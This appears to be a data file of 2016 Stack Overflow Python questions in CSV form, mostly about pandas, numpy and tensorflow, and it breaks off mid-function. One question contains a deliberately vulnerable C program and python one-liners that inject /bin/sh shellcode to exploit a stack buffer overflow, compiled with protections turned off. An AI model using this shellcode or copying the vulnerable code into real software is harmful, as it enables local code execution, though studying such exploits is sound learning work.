<p><a href=""https://docs.python.org/3/library/time.html#time.process_time"" rel=""nofollow"">https://docs.python.org/3/library/time.html#time.process_time</a></p>
"
39868990,2286762.0,2016-10-05 08:30:24+00:00,5,Unlucky number 13,"<p>I came accorss this problem <a href=""http://qa.geeksforgeeks.org/4344/the-unlucky-13"" rel=""nofollow"">Unlucky number 13! </a> recently but could not think of efficient solution this.</p>

<h3>Problem statement :</h3>

<p>N is taken as input. </p>

<blockquote>
  <p>N can be very large 0&lt;= N &lt;= 1000000009</p>
</blockquote>

<p>Find total number of such strings that are made of exactly N characters which don't include ""13"". The strings may contain any integer from 0-9, repeated any number of times.</p>

<pre><code># Example:

# N = 2 :
# output : 99 (0-99 without 13 number)

# N =1 :
# output : 10 (0-9 without 13 number)
</code></pre>

<p>My solution:</p>

<pre><code>N = int(raw_input())

if N &lt; 2:
    print 10

else:
    without_13 = 10

    for i in range(10, int('9' * N)+1):
        string = str(i)
        if string.count(""13"") &gt;= 1:
            continue
        without_13 += 1
    print without_13
</code></pre>

<h2>Output</h2>

<p>The output file should contain answer to each query in a new line modulo 1000000009.</p>

<p>Any other efficient way to solve this ? My solution gives time limit exceeded on coding site.</p>
"
40094470,1048539.0,2016-10-17 19:47:19+00:00,5,Why does adding parenthesis around a yield call in a generator allow it to compile/run?,"<p>I have a method:</p>

<pre><code>@gen.coroutine
def my_func(x):
    return 2 * x
</code></pre>

<p>basically, a tornado coroutine.</p>

<p>I am making a list such as:</p>

<pre><code>my_funcs = []
for x in range(0, 10):
    f = yield my_func(x)
    my_funcs.append(x)
</code></pre>

<p>In trying to make this a list comprehension such as:</p>

<pre><code>my_funcs = [yield my_func(i) for i in range(0,10)]
</code></pre>

<p>I realized this was invalid syntax. It <a href=""http://chat.stackoverflow.com/transcript/message/33540588#33540588"">turns out you can do this</a> using <code>()</code> around the yield:</p>

<pre><code>my_funcs = [(yield my_func(i)) for i in range(0,10)]
</code></pre>

<ul>
<li>Does this behavior (the syntax for wrapping a <code>yield foo()</code> call in () such as <code>(yield foo() )</code> in order to allow this above code to execute) have a specific type of name?

<ul>
<li>Is it some form of operator precedence with <code>yield</code>?</li>
</ul></li>
<li>Is this behavior with <code>yield</code> documented somewhere?</li>
</ul>

<p>Python 2.7.11 on OSX. This code does need to work in both Python2/3 which is why the above list comprehension is not a good idea (see <a href=""http://stackoverflow.com/a/32139977/1048539"">here</a> for why, the above list comp works in Python 2.7 but is broken in Python 3).</p>
"
39725411,3590728.0,2016-09-27 13:02:35+00:00,5,Checking if element in list by substring,"<p>I have a list of urls (<code>unicode</code>), and there is a lot of repetition.
For example, urls <code>http://www.myurlnumber1.com</code> and <code>http://www.myurlnumber1.com/foo+%bar%baz%qux</code> lead to the same place.</p>

<p>So I need to weed out all of those duplicates.</p>

<p>My first idea was to check if the element's substring is in the list, like so:</p>

<pre><code>for url in list:
    if url[:30] not in list:
        print(url)
</code></pre>

<p>However, it tries to mach literal <code>url[:30]</code> to a list element and obviously returns all of them, since there is no element that exactly matches <code>url[:30]</code>. </p>

<p>Is there an easy way to solve this problem?</p>

<p>EDIT:</p>

<p>Often the host and path in the urls stays the same, but the parameters are different. For my purposes, a url with the same hostname and path, but different parameters are still the same url and constitute a duplicate.</p>
"
40041845,3346915.0,2016-10-14 11:16:30+00:00,5,"Choosing between pandas, OOP classes, and dicts (Python)","<p>I have written a program that reads a couple of .csv files (they are not large, a couple of thousands rows each), I do some data cleaning and wrangling and this is the final structure of each .csv file looks (fake data for illustration purposes only).</p>

<pre><code>import pandas as pd
data = [[112233,'Rob',99],[445566,'John',88]]
managers = pd.DataFrame(data)
managers.columns = ['ManagerId','ManagerName','ShopId']
print managers

   ManagerId ManagerName  ShopId
0     112233         Rob      99
1     445566        John      88


data = [[99,'Shop1'],[88,'Shop2']]
shops = pd.DataFrame(data)
shops.columns = ['ShopId','ShopName']
print shops

   ShopId ShopName
0      99    Shop1
1      88    Shop2

data = [[99,2000,3000,4000],[88,2500,3500,4500]]
sales = pd.DataFrame(data)
sales.columns = ['ShopId','Year2010','Year2011','Year2012']
print sales

   ShopId  Year2010  Year2011  Year2012
0      99      2000      3000      4000
1      88      2500      3500      4500
</code></pre>

<p>Then I use <code>xlsxwriter</code> and <code>reportlab</code> Python packages for creating custom Excel sheets and .pdf reports while iterating the data frames. Everything looks great, and all of the named packages do their job really well.</p>

<p>My concern though is that I feel that my code gets hard to maintain as I need to access the same data frame rows multiple times in multiple calls.</p>

<p>Say I need to get manager names that are responsible for shops which had sales more than 1500 in year 2010. My code is filled with this kind of calls:</p>

<pre><code>managers[managers['ShopId'].isin(sales[sales['Year2010'] &gt; 1500]['ShopId'])]['ManagerName'].values
&gt;&gt;&gt; array(['Rob', 'John'], dtype=object)
</code></pre>

<p>I think it is hard to see what is going on while reading this line of code. I could create multiple intermediate variables, but this would add multiple lines of code.</p>

<p>How common is it to sacrifice database normalization ideology and merge all the pieces into a single data frame to get a more maintainable code? There are obviously cons of having a single data frame as it might get messy when trying to merge other data frames that might be needed later on. Merging them of course leads to data redundancy as the same manager can be assigned to multiple shops.</p>

<pre><code>df = managers.merge(sales,how='left',on='ShopId').merge(shops,how='left',on='ShopId')
print df

   ManagerId ManagerName  ShopId  Year2010  Year2011  Year2012 ShopName
0     112233         Rob      99      2000      3000      4000    Shop1
1     445566        John      88      2500      3500      4500    Shop2
</code></pre>

<p>At least this call gets smaller:</p>

<pre><code>df[df['Year2010'] &gt; 1500]['ManagerName'].values
&gt;&gt;&gt; array(['Rob', 'John'], dtype=object)
</code></pre>

<p>Maybe pandas is a wrong tool for this kind of job? </p>

<p>C# developers at office frown at me and tell me use the classes, but then I will have a bunch of methods like <code>get_manager_sales(managerid)</code> and so forth. Iterating class instances for reporting also sounds troublesome as I would need to implement some sorting and indexing (which I get for free with <code>pandas</code>).</p>

<p>Dictionary would work, but it makes it also difficult to modify existing data, doing merges etc. The syntax doesn't get much better either.</p>

<pre><code>data_dict = df.to_dict('records')
[{'ManagerId': 112233L,
  'ManagerName': 'Rob',
  'ShopId': 99L,
  'ShopName': 'Shop1',
  'Year2010': 2000L,
  'Year2011': 3000L,
  'Year2012': 4000L},
 {'ManagerId': 445566L,
  'ManagerName': 'John',
  'ShopId': 88L,
  'ShopName': 'Shop2',
  'Year2010': 2500L,
  'Year2011': 3500L,
  'Year2012': 4500L}]
</code></pre>

<p>Get manager names that are responsible for shops which had sales more than 1500 in year 2010.</p>

<pre><code>[row['ManagerName'] for row in data_dict if row['Year2010'] &gt; 1500]
&gt;&gt;&gt; ['Rob', 'John']
</code></pre>

<p><strong>In this particular case with the data I operate with, should I go all the way with <code>pandas</code> or is there another way to write cleaner code while taking advantage of the power of <code>pandas</code>?</strong></p>
"
39600833,5257516.0,2016-09-20 18:01:14+00:00,5,Understanding python slicings syntax as described in the python language reference,"<p>The following is the slicings syntax that I copied from <a href=""https://docs.python.org/3/reference/expressions.html#slicings"" rel=""nofollow"">The Python Language Reference</a>:</p>

<pre><code>slicing      ::=  primary ""["" slice_list ""]""
slice_list   ::=  slice_item ("","" slice_item)* ["",""]
slice_item   ::=  expression | proper_slice
proper_slice ::=  [lower_bound] "":"" [upper_bound] [ "":"" [stride] ]
lower_bound  ::=  expression
upper_bound  ::=  expression
stride       ::=  expression
</code></pre>

<p>Per my understanding, this syntax equates to <code>SomeMappingObj[slice_item,slice_item etc...]</code> which again equates to something like <code>a[0:2:1,4:7:1]</code> and <code>a =[i for i in range(20)]</code>. </p>

<p>But, I can't test this in IPython and I did not find any questions about multiple slicings. Is my interpretation about multiple slicing in python correct? What am I doing incorrectly?</p>

<pre><code>In [442]: a=[i for i in range(20)]

In [443]: a[0:12:2]
Out[443]: [0, 2, 4, 6, 8, 10]

In [444]: a[0:12:2,14:17:1]
---------------------------------------------------------------------------
TypeError                                 Traceback (most recent call last)
&lt;ipython-input-444-117395d33bfd&gt; in &lt;module&gt;()
----&gt; 1 a[0:12:2,14:17:1]

TypeError: list indices must be integers or slices, not tuple
</code></pre>
"
40092789,6581267.0,2016-10-17 17:58:45+00:00,5,How I order behavior IDublinCore in Dexterity Type?,"<p>I'm writing a product using Python Dexterity Type, and I have <code>Title</code> and <code>Description</code>, this fields come from a behavior <code>plone.app.dexterity.behaviors.metadata.IDublinCore</code>, but I neeed reorder this fields with my fields.</p>

<p>Example:</p>

<p>My fields: document, collage, age, biography</p>

<p>IDublinCore: Title, Description</p>

<p>The order: collage, Title, document, age, biography, Description</p>

<p>How I Do it?</p>
"
40076861,1107049.0,2016-10-17 00:09:22+00:00,5,How to merge two DataFrames into single matching the column values,"<p>Two DataFrames have matching values stored in their corresponding 'names' and 'flights' columns.
While the first DataFrame stores the distances the other stores the dates:</p>

<pre><code>import pandas as pd   

distances = {'names': ['A', 'B','C'] ,'distances':[100, 200, 300]}
dates = {'flights': ['C', 'B', 'A'] ,'dates':['1/1/16', '1/2/16', '1/3/16']}

distancesDF = pd.DataFrame(distances)
datesDF = pd.DataFrame(dates)
</code></pre>

<p>distancesDF:</p>

<pre><code>   distances    names
0        100        A
1        200        B
2        300        C
</code></pre>

<p>datesDF:</p>

<pre><code>    dates  flights
0  1/1/16        A
1  1/2/16        B
2  1/3/16        C
</code></pre>

<p>I would like to merge them into single Dataframe in a such a way that the matching entities are synced with the corresponding distances and dates. So the resulted DataFame would look like this:</p>

<p>resultDF:</p>

<pre><code>   distances    names     dates 
0        100        A    1/1/16 
1        200        B    1/2/16 
2        300        C    1/3/16
</code></pre>

<p>What would be the way of accomplishing it?</p>
"
40009015,2434234.0,2016-10-12 21:54:26+00:00,5,How is python storing strings so that the 'is' operator works on literals?,"<p>In python </p>

<pre><code>&gt;&gt;&gt; a = 5
&gt;&gt;&gt; a is 5
True
</code></pre>

<p>but </p>

<pre><code>&gt;&gt;&gt; a = 500
&gt;&gt;&gt; a is 500
False
</code></pre>

<p>This is because it stores low integers as a single address. But once the numbers begin to be complex, each int gets its own unique address space. This makes sense to me.</p>

<blockquote>
  <p>The current implementation keeps an array of integer objects for all integers between -5 and 256, when you create an int in that range you actually just get back a reference to the existing object. </p>
</blockquote>

<p>So now, why does this not apply to strings? Are not strings just as complex as large integers (if not moreso)?</p>

<pre><code>&gt;&gt;&gt; a = '1234567'
&gt;&gt;&gt; a is '1234567'
True
</code></pre>

<p>How does python use the same address for all string literals efficiently? It cant keep an array of every possible string like it does for numbers.</p>
"
39758449,2308132.0,2016-09-28 22:08:13+00:00,5,Normalise between 0 and 1 ignoring NaN,"<p>For a list of numbers ranging from <code>x</code> to <code>y</code> that may contain <code>NaN</code>, how can I normalise between 0 and 1, ignoring the <code>NaN</code> values (they stay as <code>NaN</code>).</p>

<p>Typically I would use <code>MinMaxScaler</code> (<a href=""http://scikit-learn.org/stable/modules/generated/sklearn.preprocessing.MinMaxScaler.html#sklearn.preprocessing.MinMaxScaler"" rel=""nofollow"">ref page</a>) from <code>sklearn.preprocessing</code>, but this cannot handle <code>NaN</code> and recommends imputing the values based on mean or median etc. it doesn't offer the option to ignore all the <code>NaN</code> values.</p>
"
40101371,640739.0,2016-10-18 06:49:08+00:00,5,How to replace each array element by 4 copies in Python?,"<p>How do I use numpy / python array routines to do this ?</p>

<p>E.g. If I have array <code>[ [1,2,3,4,]]</code> , the output should be </p>

<pre><code>[[1,1,2,2,],
 [1,1,2,2,],
 [3,3,4,4,],
 [3,3,4,4]]
</code></pre>

<p>Thus, the output is array of double the row and column dimensions. And each element from original array is repeated three times. </p>

<p>What I have so far is this</p>

<pre><code>def operation(mat,step=2):
    result = np.array(mat,copy=True)
    result[::2,::2] = mat
    return result
</code></pre>

<p>This gives me array </p>

<pre><code>[[ 98.+0.j   0.+0.j  40.+0.j   0.+0.j]
 [  0.+0.j   0.+0.j   0.+0.j   0.+0.j]
 [ 29.+0.j   0.+0.j  54.+0.j   0.+0.j]
 [  0.+0.j   0.+0.j   0.+0.j   0.+0.j]]
</code></pre>

<p>for the input</p>

<pre><code>[[98 40]
 [29 54]]
</code></pre>

<p>The array will always be of even dimensions.</p>
"
39732600,2715077.0,2016-09-27 19:14:19+00:00,5,Why is my stack buffer overflow exploit not working?,"<p>So I have a really simple stackoverflow:</p>

<pre><code>#include &lt;stdio.h&gt;

int main(int argc, char *argv[]) {

    char buf[256];
    memcpy(buf, argv[1],strlen(argv[1]));
    printf(buf);

}
</code></pre>

<p>I'm trying to overflow with this code:</p>

<pre><code>$(python -c ""print '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80' + 'A'*237 + 'c8f4ffbf'.decode('hex')"")
</code></pre>

<p>When I overflow the stack, I successfully overwrite EIP with my wanted address but then nothing happens. It doesn't execute my shellcode.</p>

<p>Does anyone see the problem? Note: My python may be wrong.</p>

<hr>

<p>UPDATE</p>

<p>What I don't understand is why my code is not executing. For instance if I point eip to nops, the nops never get executed. Like so,  </p>

<pre><code>$(python -c ""print '\x90'*50 + 'A'*210 + '\xc8\xf4\xff\xbf'"")
</code></pre>

<hr>

<p>UPDATE</p>

<p>Could someone be kind enough to exploit this overflow yourself on linux
 x86 and post the results?</p>

<hr>

<p>UPDATE</p>

<p>Nevermind ya'll, I got it working. Thanks for all your help.</p>

<hr>

<p>UPDATE</p>

<p>Well, I thought I did. I did get a shell, but now I'm trying again and I'm having problems.</p>

<p>All Im doing is overflowing the stack at the beginning and pointing my shellcode there.</p>

<p>Like so,</p>

<pre><code>r $(python -c 'print ""A""*260 + ""\xcc\xf5\xff\xbf""')
</code></pre>

<p>This should point to the A's. Now what I dont understand is why my address at the end gets changed in gdb.</p>

<p>This is what gdb gives me,</p>

<pre><code>Program received signal SIGTRAP, Trace/breakpoint trap.
0xbffff5cd in ?? ()
</code></pre>

<p>The \xcc gets changed to \xcd. Could this have something to do with the error I get with gdb?</p>

<p>When I fill that address with ""B""'s for instance it resolves fine with \x42\x42\x42\x42. So what gives?</p>

<p>Any help would be appreciated.</p>

<p>Also, I'm compiling with the following options:</p>

<pre><code>gcc -fno-stack-protector -z execstack -mpreferred-stack-boundary=2 -o so so.c
</code></pre>

<p>It's really odd because any other address works except the one I need.</p>

<hr>

<p>UPDATE</p>

<p>I can successfully spawn a shell with the following in gdb,</p>

<pre><code>$(python -c ""print '\x90'*37 +'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80' + 'A'*200 + '\xc8\xf4\xff\xbf'"")
</code></pre>

<p>But I don't understand why this works sometimes and doesn't work other times. Sometimes my overwritten eip is changed by gdb. Does anyone know what I am missing? Also, I can only spwan a shell in gdb and not in the normal process. And on top of that, I can only seem to start a shell once in gdb and then gdb stops working.</p>

<p>For instance, now when I run the following I get this in gdb...</p>

<pre><code>Starting program: /root/so $(python -c 'print ""A""*260 + ""\xc8\xf4\xff\xbf""')

Program received signal SIGSEGV, Segmentation fault.
0xbffff5cc in ?? ()
</code></pre>

<p>This seems to be caused by execstack be turned on.</p>

<hr>

<p>UPDATE</p>

<p>Yeah, for some reason I'm getting different results but the exploit is working now. So thank you everyone for your help. If anyone can explain the results I received above, I'm all ears. Thanks.</p>
"
40024721,3130926.0,2016-10-13 15:08:27+00:00,5,pandas slicing multiindex dataframe,"<p>I want to slice a multi-index pandas dataframe</p>

<p>here is the code to obtain my test data: </p>

<pre><code>import pandas as pd

testdf = {
    'Name': {
        0: 'H', 1: 'H', 2: 'H', 3: 'H', 4: 'H'}, 'Division': {
            0: 'C', 1: 'C', 2: 'C', 3: 'C', 4: 'C'}, 'EmployeeId': {
                0: 14, 1: 14, 2: 14, 3: 14, 4: 14}, 'Amt1': {
                    0: 124.39, 1: 186.78, 2: 127.94, 3: 258.35000000000002, 4: 284.77999999999997}, 'Amt2': {
                        0: 30.0, 1: 30.0, 2: 30.0, 3: 30.0, 4: 60.0}, 'Employer': {
                            0: 'Z', 1: 'Z', 2: 'Z', 3: 'Z', 4: 'Z'}, 'PersonId': {
                                0: 14, 1: 14, 2: 14, 3: 14, 4: 15}, 'Provider': {
                                    0: 'A', 1: 'A', 2: 'A', 3: 'A', 4: 'B'}, 'Year': {
                                        0: 2012, 1: 2012, 2: 2013, 3: 2013, 4: 2012}}
testdf = pd.DataFrame(testdf)
testdf
grouper_keys = [
    'Employer',
    'Year',
    'Division',
    'Name',
    'EmployeeId',
    'PersonId']

testdf2 = pd.pivot_table(data=testdf,
                              values='Amt1',
                              index=grouper_keys,
                              columns='Provider',
                              fill_value=None,
                              margins=False,
                              dropna=True,
                              aggfunc=('sum', 'count'),
                              )

print(testdf2)
</code></pre>

<p>gives:</p>

<p><a href=""https://i.stack.imgur.com/FKUWq.png""><img src=""https://i.stack.imgur.com/FKUWq.png"" alt=""enter image description here""></a></p>

<p>Now I can get only <code>sum</code> for <code>A</code> or <code>B</code> using </p>

<pre><code>testdf2.loc[:, slice(None, ('sum', 'A'))]
</code></pre>

<p>which gives </p>

<p><a href=""https://i.stack.imgur.com/kKrZS.png""><img src=""https://i.stack.imgur.com/kKrZS.png"" alt=""enter image description here""></a></p>

<p>How can I get <strong>both</strong> <code>sum</code> <strong>and</strong> <code>count</code> for only <code>A</code> or <code>B</code></p>
"
39693126,1675168.0,2016-09-26 00:23:10+00:00,5,Django: How do I use a foreign key field in aggregation?,"<p>Let's say I have the following two models:</p>

<pre><code>class Parent(models.Model):
    factor = models.DecimalField(...)
    ... other fields

class Child(models.Model):
    field_a = models.DecimalField(...)
    field_b = models.DecimalField(...)
    parent = models.ForeignKey(Parent)
    ... other fields
</code></pre>

<p>Now I want to calculate the sum of <code>(field_a * field_b * factor)</code> of all objects in the <code>Child</code> model. I can calculate the sum of <code>(field_a * field_b)</code> with <code>aggregate(value=Sum(F('field_a')*F('field_b'), output_field=DecimalField()))</code>. My question is how I can pull out the <code>factor</code> field from the <code>Parent</code> model?</p>

<p>I am new to Django and I really appreciate your help!</p>
"
39986925,3679490.0,2016-10-11 21:19:43+00:00,4,Pandas Multiple columns same name,"<p>I am creating a <code>dataframe</code> from <code>csv</code>.I have gone thru the docs,multiple <code>SO</code> posts,links as i have just started <code>Pandas</code> but didnt get it.The csv has multiple columns with same names say <code>a</code>.</p>

<p>So after forming <code>dataframe</code> and when i do <code>df['a']</code> which value will it return? It does not return all values .</p>

<p>Also only one of the values will have a string rest will be <code>None</code> .How can i get that column?</p>
"
39909214,4596596.0,2016-10-07 04:07:02+00:00,4,How can I only parse/split this list with multiple colons in each element? Create dictionary,"<p>I have the following Python list:</p>

<pre><code>list1 = ['EW:G:B&lt;&lt;LADHFSSFAFFF', 'CB:E:OWTOWTW', 'PP:E:A,A&lt;F&lt;AF', 'GR:A:OUO-1-XXX-EGD:forthyFive:1:HMJeCXX:7', 'SX:F:-111', 'DS:f:115.5', 'MW:AA:0', 'MA:A:0XT:i:0', 'EY:EE:KJERWEWERKJWE']
</code></pre>

<p>I would like to take the entries of this list and create a dictionary of key-values pairs that looks like</p>

<pre><code>dictionary_list1 = {'EW':'G:B&lt;&lt;LADHFSSFAFFF', 'CB':'E:OWTOWTW', 'PP':'E:A,A&lt;F&lt;AF', 'GR':'A:OUO-1-XXX-EGD:forthyFive:1:HMJeCXX:7', 'SX':'F:-111', 'DS':'f:115.5', 'MW':'AA:0', 'MA':'A:0XT:i:0', 'EW':'EE:KJERWEWERKJWE'}
</code></pre>

<p>How does one parse/split the list above <code>list1</code> to do this? My first instinct was to try <code>try1 = list1.split("":"")</code>, but then I think it is impossible to retrieve the ""key"" for this list, as there are multiple colons <code>:</code></p>

<p>What is the most pythonic way to do this? </p>
"
39714682,6724844.0,2016-09-27 01:24:02+00:00,4,How to add new column with handling nan value,"<p>I have a dataframe like this</p>

<pre><code>    A   B
0   a   1
1   b   2
2   c   3
3   d  nan
4   e  nan
</code></pre>

<p>I would like to add column C like below</p>

<pre><code>    A   B    C
0   a   1    a1
1   b   2    b2
2   c   3    c3
3   d  nan   d
4   e  nan   e
</code></pre>

<p>So I tried </p>

<pre><code>df[""C""]=df.A+df.B
</code></pre>

<p>but It returns </p>

<pre><code> C
a1
b2
c3
nan
nan
</code></pre>

<p>How can get correct result?</p>
"
39946092,6728318.0,2016-10-09 16:53:05+00:00,4,How to convert numbers in a string without using lists?,"<p>My prof wants me to create a function that return the sum of numbers in a string but without using any lists or list methods.</p>

<p>The function should look like this when operating:</p>

<pre><code>&gt;&gt;&gt; sum_numbers('34 3 542 11')
    590
</code></pre>

<p>Usually a function like this would be easy to create when using lists and list methods. But trying to do so without using them is a nightmare.</p>

<p>I tried the following code but they don't work:</p>

<pre><code> &gt;&gt;&gt; def sum_numbers(s):
    for i in range(len(s)):
        int(i)
        total = s[i] + s[i]
        return total


&gt;&gt;&gt; sum_numbers('1 2 3')
'11'
</code></pre>

<p>Instead of getting 1, 2, and 3 all converted into integers and added together, I instead get the string '11'. In other words, the numbers in the string still have not been converted to integers.</p>

<p>I also tried using a <code>map()</code> function but I just got the same results:</p>

<pre><code>&gt;&gt;&gt; def sum_numbers(s):
    for i in range(len(s)):
        map(int, s[i])
        total = s[i] + s[i]
        return total


&gt;&gt;&gt; sum_numbers('1 2 3')
'11'
</code></pre>
"
39987596,6736042.0,2016-10-11 22:11:51+00:00,4,"Calculating similarity ""score"" between multiple dictionaries","<p>I have a reference dictionary, ""dictA"" and I need to compare it (calculate similarity between key and vules) to n amount of dictionaries that are generated on the spot. Each dictionary has the same length. Lets say for the sake of the discussion that the n amount of dictionaries to compare it with is 3: dictB, dictC, dictD.</p>

<p>Here is how dictA looks like:</p>

<pre><code>dictA={'1':""U"", '2':""D"", '3':""D"", '4':""U"", '5':""U"",'6':""U""}
</code></pre>

<p>Here are how dictB,dictC and dictD look like:</p>

<pre><code>dictB={'1':""U"", '2':""U"", '3':""D"", '4':""D"", '5':""U"",'6':""D""}
dictC={'1':""U"", '2':""U"", '3':""U"", '4':""D"", '5':""U"",'6':""D""}
dictD={'1':""D"", '2':""U"", '3':""U"", '4':""U"", '5':""D"",'6':""D""}
</code></pre>

<p>I have a solution, but just for the option of two dictionaries:</p>

<pre><code>sharedValue = set(dictA.items()) &amp; set(dictD.items())
dictLength = len(dictA)
scoreOfSimilarity = len(sharedValue)
similarity = scoreOfSimilarity/dictLength
</code></pre>

<p>My questions is:
How can I iterate through n amount of dictionaries with dictA being a primary dictionary which I compare others with. The goal is to get a ""similarity"" value for each dictionary I am gonna iterate through against the primary dictionary. </p>

<p>Thanks for your help.</p>
"
40061297,,2016-10-15 16:08:14+00:00,4,Automate students tests run,"<p>I have a folders structure for some tasks, they are like this:</p>

<pre><code>- student_id1/answers.py
- student_id2/answers.py
- student_id3/answers.py
- student_id4/answers.py
- ...
</code></pre>

<p>I have a main file: <code>run_tests.py</code>:</p>

<pre><code>from student_id1.answers import run_test as test1
from student_id2.answers import run_test as test2
...


try:
    test1()
    print(""student_id1: OK"")
except Exception as ee:
    print(""Error for student_id1"")

try:
    test2()
    print(""student_id2: OK"")
except Exception as ee:
    print(""Error for student_id2"")
...
</code></pre>

<p>There can be more folders as they are adding with each new student. I would like to call all tests with a single command, but do not want to add so much lines with each new student.</p>

<p>How can I automate this?</p>
"
39729787,4394807.0,2016-09-27 16:25:24+00:00,4,Tensorflow: why 'pip uninstall tensorflow' cannot find tensorflow,"<p>I'm using Tensorflow-0.8 on Ubuntu14.04. I first install Tensorflow from sources and then setup Tensorflow for development according to the <a href=""https://www.tensorflow.org/versions/r0.10/get_started/os_setup.html#setting-up-tensorflow-for-development"" rel=""nofollow"">official tutorial</a>. When I want to uninstall tensorflow using the following command</p>

<pre><code>sudo pip uninstall tensorflow
</code></pre>

<p>I encountered the following error:</p>

<pre><code>Can't uninstall 'tensorflow'. No files were found to uninstall
</code></pre>

<p>Could anyone tell me where is wrong?</p>

<p>For your reference, the output of 
<code>pip show tensorflow</code> is</p>

<pre><code>Name: tensorflow
Version: 0.8.0
Location: /home/AIJ/tensorflow/_python_build
Requires: numpy, six, protobuf, wheel
</code></pre>

<p>But I actually find another Tensorflow directory at </p>

<pre><code>/usr/local/lib/python2.7/dist-packages/tensorflow
</code></pre>

<p>Besides, I also have a question about the general usage of Python. I have seen two quite similar directories in my system, i.e.</p>

<pre><code>/usr/lib/python2.7/dist-packages
/usr/local/lib/python2.7/dist-packages
</code></pre>

<p>Could any one tell me the differences between them? I noticed that everytime I use <code>sudo pip install &lt;package&gt;</code>, the package will be installed to <code>/usr/local/lib/python2.7/dist-packages</code>, could I instead install packages into <code>/usr/lib/python2.7/dist-packages</code> using <code>pip install</code>?</p>

<p>Thanks a lot for your help in advance!</p>
"
39987071,2605262.0,2016-10-11 21:29:35+00:00,4,Plotting a dataframe as both a 'hist' and 'kde' on the same plot,"<p>I have a pandas <code>dataframe</code> with user information. I would like to plot the age of users as both a <code>kind='kde'</code> and on <code>kind='hist'</code> on the same plot. At the moment I am able to have the two separate plots. The dataframe resembles:</p>

<pre><code>member_df=    
user_id    Age
1          23
2          34
3          63 
4          18
5          53  
...
</code></pre>

<p>using </p>

<pre><code>ax1 = plt.subplot2grid((2,3), (0,0))
member_df.Age.plot(kind='kde', xlim=[16, 100])
ax1.set_xlabel('Age')

ax2 = plt.subplot2grid((2,3), (0,1))
member_df.Age.plot(kind='hist', bins=40)
ax2.set_xlabel('Age')

ax3 = ...
</code></pre>

<p>I understand that the <code>kind='kde'</code> will give me frequencies for the y-axis whereas  <code>kind='kde'</code> will give a cumulative distribution, but is there a way to combine both and have the y-axis be represented by the frequencies?</p>
"
39904590,4926846.0,2016-10-06 19:54:13+00:00,4,Why can't class variables be used in __init__ keyword arg?,"<p>I can't find any documentation on when exactly a class can reference itself. In the following it will fail. This is because the class has been created but not initialized until after <code>__init__</code>'s first line, correct?</p>

<pre><code>class A(object):
    class_var = 'Hi'
    def __init__(self, var=A.class_var):
        self.var = var
</code></pre>

<p>So in the use case where I want to do that is this the best solution:</p>

<pre><code>class A(object):
    class_var = 'Hi'
    def __init__(self, var=None)
        if var is None:
            var = A.class_var
        self.var = var
</code></pre>

<p>Any help or documentation appreciated!</p>
"
40077209,6824986.0,2016-10-17 01:10:11+00:00,4,How to extract and divide values from dictionary with another in Python?,"<pre><code>sample = [['CGG','ATT'],['GCGC','TAAA']]

#Frequencies of each base in the pair
d1 = [[{'G': 0.66, 'C': 0.33}, {'A': 0.33, 'T': 0.66}], [{'G': 0.5, 'C': 0.5}, {'A': 0.75, 'T': 0.25}]]

#Frequencies of each pair occurring together

d2 = [{('C', 'A'): 0.33, ('G', 'T'): 0.66}, {('G', 'T'): 0.25, ('C', 'A'): 0.5, ('G', 'A'): 0.25}]
</code></pre>

<p>The Problem:</p>

<p>Consider the first pair : ['CGG','ATT']</p>

<p>How to calculate a, where a is :</p>

<pre><code>float(a) = (freq of pairs) - ((freq of C in CGG) * (freq of A in ATT))

eg. in CA pairs, float (a) = (freq of CA pairs) - ((freq of C in CGG) * (freq of A in ATT))

Output a = (0.33) - ((0.33) * (0.33)) = 0.222222
</code></pre>

<p>Calculating ""a"" for any one combination (either CA pair or GT pair)</p>

<pre><code>Final Output for sample : a = [0.2222, - 0.125]
</code></pre>

<p>How to calculate b, where b is :</p>

<pre><code>float (b) = (float(a)^2)/ (freq of C in CGG) * (freq G in CGG) * (freq A in ATT) * (freq of T in ATT)

Output b = 1
</code></pre>

<p>Do this for the entire list</p>

<pre><code>Final Output for sample : b = [1, 0.3333]
</code></pre>

<p>I do not know how to extract the required values from d1 and d2 and perform the mathematical operations. </p>

<p>I tried to write the following code for value of a</p>

<pre><code>float a = {k: float(d1[k][0]) - d2[k][0] * d2[k][1]for k in d1.viewkeys() &amp; d2.viewkeys()}
</code></pre>

<p>But, it does not work. Also, I prefer a for loop instead of comprehensions</p>

<p>My attempt to write (a pretty flawed) for-loop for the above:</p>

<pre><code>float_a = []
for pair,i in enumerate(d2):
    for base,j in enumerate(d1):
        float (a) = pair[i][0] - base[j][] * base[j+1][]
        float_a.append(a)

float_b = []
  for floata in enumerate(float_a):
    for base,j in enumerate(d1):
        float (b) = (float(a) * float(a)) - (base[j] *    base[j+1]*base[j+2]*base[j+3])
        float_b.append(b)
</code></pre>
"
39714374,6884866.0,2016-09-27 00:36:47+00:00,4,NaN results in tensorflow Neural Network,"<p>I have this problem that after one iteration nearly all my parameters (cost function, weights, hypothesis function, etc.) output 'NaN'. My code is similar to the tensorflow tutorial MNIST-Expert (<a href=""https://www.tensorflow.org/versions/r0.9/tutorials/mnist/pros/index.html"" rel=""nofollow"">https://www.tensorflow.org/versions/r0.9/tutorials/mnist/pros/index.html</a>). I looked for solutions already and so far I tried: reducing the learning rate to nearly zero and setting it to zero, using AdamOptimizer instead of gradient descent, using sigmoid function for the hypothesis function in the last layer and using only numpy functions. I have some negative and zero values in my input data, so I can't use the logarithmic cross entropy instead of the quadratic cost function. The result is the same, butMy input data consist of stresses and strains of soils.</p>

<pre><code>import tensorflow as tf
import Datafiles3_pv_complete as soil
import numpy as np

m_training = int(18.0)
m_cv = int(5.0)
m_test = int(5.0)
total_examples = 28

"" range for running ""
range_training = xrange(0,m_training)
range_cv = xrange(m_training,(m_training+m_cv))
range_test = xrange((m_training+m_cv),total_examples)

"""""" Using interactive Sessions""""""
sess = tf.InteractiveSession()

"""""" creating input and output vectors """"""
x = tf.placeholder(tf.float32, shape=[None, 11])
y_true = tf.placeholder(tf.float32, shape=[None, 3])

"""""" Standard Deviation Calculation""""""
stdev = np.divide(2.0,np.sqrt(np.prod(x.get_shape().as_list()[1:])))

"""""" Weights and Biases """"""

def weights(shape):
    initial = tf.truncated_normal(shape, stddev=stdev)
    return tf.Variable(initial)

def bias(shape):
